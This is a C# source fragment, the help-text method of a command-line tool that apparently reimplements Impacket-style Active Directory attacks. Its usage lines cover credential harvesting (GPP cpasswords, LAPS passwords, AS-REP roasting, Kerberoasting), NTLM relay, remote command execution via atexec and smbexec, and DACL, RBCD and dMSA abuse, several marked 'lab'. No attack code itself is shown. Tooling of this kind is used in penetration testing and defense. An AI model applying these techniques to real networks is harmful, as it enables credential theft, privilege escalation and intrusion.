    Console.WriteLine("  smb2-login <host> <user> <password> [domain] [port]");
    Console.WriteLine("                   Live SMB2 NEGOTIATE + NTLMv2 SESSION_SETUP; dump both handshake rounds.");
    Console.WriteLine("  smb2-connect <host> <share> <user> <password> [domain] [port]");
    Console.WriteLine("                   Full session: NEGOTIATE + SESSION_SETUP + signed TREE_CONNECT to a share.");
    Console.WriteLine("  smb2-cat <host> <share> <path> <user> <password> [domain] [port]");
    Console.WriteLine("                   Read a file over SMB2: TREE_CONNECT + CREATE + READ + CLOSE.");
    Console.WriteLine("  smb2-ls <host> <share> <user> <password> [path] [domain] [port]");
    Console.WriteLine("                   List a directory over SMB2: CREATE(dir) + QUERY_DIRECTORY.");
    Console.WriteLine("  smb2-info <host> <share> <user> <password> [domain] [port]");
    Console.WriteLine("  smb-attrib <host> <share> <path> <user> <password> [domain] [port]   # attrib: query DOS attributes");
    Console.WriteLine("  smb-attrib-set <host> <share> <path> <user> <password> <attrs> [domain] [port]   # attrib: set DOS attributes (RHSATN/clear)");
    Console.WriteLine("                   Filesystem info over SMB2: QUERY_INFO (volume label/serial, size).");
    Console.WriteLine("  dcerpc-bind <host> <user> <password> [interface] [domain] [port]");
    Console.WriteLine("                   Open a named pipe on IPC$ and DCERPC BIND (srvsvc/wkssvc/lsarpc/samr/svcctl).");
    Console.WriteLine("  rpc-shares <host> <user> <password> [domain] [port]");
    Console.WriteLine("                   Enumerate shares via srvsvc NetrShareEnum (DCERPC REQUEST/RESPONSE + NDR).");
    Console.WriteLine("  rpc-shares-sealed <host> <user> <password> [seal|sign] [domain] [port]");
    Console.WriteLine("                   NetrShareEnum over an NTLMSSP-authenticated bind with packet privacy/integrity.");
    Console.WriteLine("  rpc-addcomputer <host> <user> <password> <computer-name> [domain] [port]   # addcomputer (SAMR): create+delete a machine account (lab)");
    Console.WriteLine("  atexec <host> <user> <password> <command> [domain] [port]   # atexec: run a command via the Task Scheduler (MS-TSCH, Windows-only)");
    Console.WriteLine("  rpc-changepw <host> <user> <oldpassword> <newpassword> [domain] [port]   # changepasswd (SAMR): change your own password");
    Console.WriteLine("  rpc-dump <host> <user> <password> [domain] [port]");
    Console.WriteLine("                   Enumerate registered RPC interfaces via mgmt inq_if_ids (rpcdump, over SMB).");
    Console.WriteLine("  smb-ntlminfo <host> [port]   # DumpNTLMInfo: host/OS/DNS names from the NTLM handshake (no creds)");
    Console.WriteLine("  gpp-passwords <host> <user> <password> [domain] [share=SYSVOL] [port]   # Get-GPPPassword: find+decrypt GPP cpasswords");
    Console.WriteLine("  badsuccessor <search|add|delete|modify> <host> <user> <password> <domain-fqdn> [dmsa] [target-ou] [target]   # BadSuccessor dMSA (lab)");
    Console.WriteLine("  get-adcomputers <host> <user> <password> <domain-fqdn> [port]   # GetADComputers: LDAP search for computer objects");
    Console.WriteLine("  get-adusers <host> <user> <password> <domain-fqdn> [all] [port]   # GetADUsers: LDAP search for user accounts");
    Console.WriteLine("  get-laps <host> <user> <password> <domain-fqdn> [computer] [port]   # GetLAPSPassword: LDAP search for LAPS passwords");
    Console.WriteLine("  get-npusers <host> <user> <password> <domain-fqdn> [target-user] [port]   # GetNPUsers: AS-REP roast accounts without pre-auth");
    Console.WriteLine("  kerb-tgt <host> <user> <password> <domain-fqdn> [port]   # getTGT: request a Kerberos TGT (RC4 pre-auth)");
    Console.WriteLine("  get-userspns <host> <user> <password> <domain-fqdn> [target-user] [port]   # GetUserSPNs: Kerberoast SPN accounts");
    Console.WriteLine("  ldap-signing <host> <domain> [port]   # CheckLDAPStatus (does the DC require LDAP signing)");
    Console.WriteLine("  rpc-dump-tcp <host> [port]");
    Console.WriteLine("                   Same, but DCERPC directly over TCP (ncacn_ip_tcp) to the endpoint mapper.");
    Console.WriteLine("  rpc-getarch <host> [port]");
    Console.WriteLine("                   Detect target architecture via an NDR+NDR64 two-context bind (getarch).");
    Console.WriteLine("  rpc-epm-map <host> [interface=samr] [port]");
    Console.WriteLine("                   Resolve an interface's dynamic TCP port via the endpoint mapper (ept_map).");
    Console.WriteLine("  rpc-samr-tcp <host> <user> <password> [domain] [epm-port]");
    Console.WriteLine("                   Full RPC-over-TCP flow: ept_map samr -> connect -> sealed bind -> enum (no SMB).");
    Console.WriteLine("  mssql-cbt <host> [port]   # checkMSSQLStatus: TDS PRELOGIN encryption posture (channel-binding precondition)");
    Console.WriteLine("  dacledit <read|write|remove|backup|restore> <host> <user> <password> <domain-fqdn> <target> [principal] [rights] [ace-type] [file]   # dacledit: read/edit an object's DACL (lab)");
    Console.WriteLine("  owneredit <read|write> <host> <user> <password> <domain-fqdn> <target> [new-owner]   # owneredit: read/set an object's owner (lab)");
    Console.WriteLine("  rbcd <read|write|remove|flush> <host> <user> <password> <domain-fqdn> <delegate-to> [delegate-from]   # rbcd: msDS-AllowedToActOnBehalfOfOtherIdentity (lab)");
    Console.WriteLine("  ntlmrelayx <target-host> [listen-port] [victim-user victim-pass [domain]]   # ntlmrelayx: SMB->SMB NTLM relay (lab)");
    Console.WriteLine("  ntlmrelayx-http <target-host> [listen-port] [victim-user victim-pass [domain]]   # ntlmrelayx: HTTP->SMB NTLM relay (lab)");
    Console.WriteLine("  ntlmrelayx-ldap <dc-host> <listen-port> <victim-user> <victim-pass> <domain-fqdn>   # ntlmrelayx: SMB->LDAP relay (ldapattack, lab)");
    Console.WriteLine("  rpc-services <host> <user> <password> [domain] [port]");
    Console.WriteLine("                   List installed services via svcctl REnumServicesStatusW (services.py list).");
    Console.WriteLine("  rpc-svcconfig <host> <user> <password> <service> [domain] [port]");
    Console.WriteLine("                   Query one service's config (binary path, start type, account) via QueryServiceConfigW.");
    Console.WriteLine("  rpc-svcstatus <host> <user> <password> <service> [domain] [port]");
    Console.WriteLine("                   Query one service's live SERVICE_STATUS (run state, controls) via RQueryServiceStatus.");
    Console.WriteLine("  rpc-svcctl <host> <user> <password> [domain] [port]");
    Console.WriteLine("                   Lab demo of svcctl service creation (psexec wire signature; benign marker).");
    Console.WriteLine("  smbexec <host> <user> <password> <command> [share=C$] [domain] [port]");
    Console.WriteLine("                   smbexec: run a command via a one-shot svcctl service (lab-only exec).");
    Console.WriteLine("  rpc-hostinfo <host> <user> <password> [domain] [port]");
    Console.WriteLine("  rpc-srvinfo <host> <user> <password> [domain] [port]");
    Console.WriteLine("                   Host/OS recon via wkssvc NetrWkstaGetInfo + srvsvc NetrServerGetInfo.");
    Console.WriteLine("  rpc-lsa <host> <user> <password> [domain] [port]");
    Console.WriteLine("                   Domain recon via lsarpc: account domain name + SID.");
    Console.WriteLine("  rpc-privs <host> <user> <password> [domain] [port]");
    Console.WriteLine("  rpc-accountrights <host> <user> <password> <sid> [domain] [port]");
    Console.WriteLine("  rpc-privlookup <host> <user> <password> <privilege-name|luid> [domain] [port]");
    Console.WriteLine("                   Enumerate LSA privileges via lsarpc LsarEnumeratePrivileges.");
    Console.WriteLine("  rpc-lookupsid <host> <user> <password> [domain] [port]");
    Console.WriteLine("                   SID->name recon via lsat LsarLookupSids (well-known SIDs + domain RIDs).");
    Console.WriteLine("  rpc-lookupsid2 <host> <user> <password> [domain] [port]");
    Console.WriteLine("                   SID->name via lsat LsarLookupSids2 (opnum 57) — the modern-Windows variant.");
    Console.WriteLine("  rpc-enumusers <host> <user> <password> [domain] [port]");
    Console.WriteLine("  rpc-dispinfo <host> <user> <password> [domain] [port]");
    Console.WriteLine("  rpc-dispgroups <host> <user> <password> [domain] [port]");
    Console.WriteLine("  rpc-domaininfo <host> <user> <password> [domain] [port]");
    Console.WriteLine("  rpc-samrdump <host> <user> <password> [domain] [port]");
    Console.WriteLine("  rpc-aliasmem <host> <user> <password> [alias-name|rid] [domain] [port]");
    Console.WriteLine("                   Domain user enumeration via samr (samrdump / enumdomusers behavior).");
    Console.WriteLine("  rpc-userinfo <host> <user> <password> <target-user> [domain] [port]");
    Console.WriteLine("                   Per-user detail via samr QueryInformationUser2 level 21 (flags, timestamps).");
    Console.WriteLine("  rpc-lookuprid <host> <user> <password> <names-csv> [domain] [port]");
    Console.WriteLine("                   Name->RID resolution via samr SamrLookupNamesInDomain (opnum 17).");
    Console.WriteLine("  rpc-lookupid <host> <user> <password> <rids-csv> [domain] [port]");
    Console.WriteLine("                   RID->name resolution via samr SamrLookupIdsInDomain (opnum 18).");
    Console.WriteLine("  rpc-enumgroups <host> <user> <password> [domain] [port]");
    Console.WriteLine("                   Domain group + alias enumeration via samr (samrdump groups).");
    Console.WriteLine("  rpc-passpol <host> <user> <password> [domain] [port]");
    Console.WriteLine("                   Domain password + lockout policy via samr SamrQueryInformationDomain.");
    Console.WriteLine("  rpc-lookupnames <host> <user> <password> [names csv] [domain] [port]");
    Console.WriteLine("                   Name->SID recon via lsat LsarLookupNames (inverse of lookupsid).");
    Console.WriteLine("  rpc-lookupnames2 <host> <user> <password> [names csv] [domain] [port]");
    Console.WriteLine("                   Name->SID via lsat LsarLookupNames2 (opnum 58) — the modern-Windows variant.");
    Console.WriteLine("  rpc-reg <host> <user> <password> [subkey] [domain] [port]");
    Console.WriteLine("                   Remote-registry recon via winreg (MS-RRP): OpenHKLM + GetVersion + OpenKey.");
    Console.WriteLine("  rpc-regquery <host> <user> <password> <subkey> <value> [domain] [port]");
    Console.WriteLine("                   Read a registry value via winreg BaseRegQueryValue (reg query KEY -v VALUE).");
    Console.WriteLine("  rpc-regenum <host> <user> <password> [subkey] [domain] [port]");
    Console.WriteLine("                   Enumerate a key's values via winreg BaseRegEnumValue (reg query KEY).");
    Console.WriteLine("  rpc-regkeys <host> <user> <password> [subkey] [domain] [port]");
    Console.WriteLine("                   Enumerate a key's subkeys via winreg BaseRegEnumKey (reg query KEY).");
    Console.WriteLine("  help             Show this help.");
}
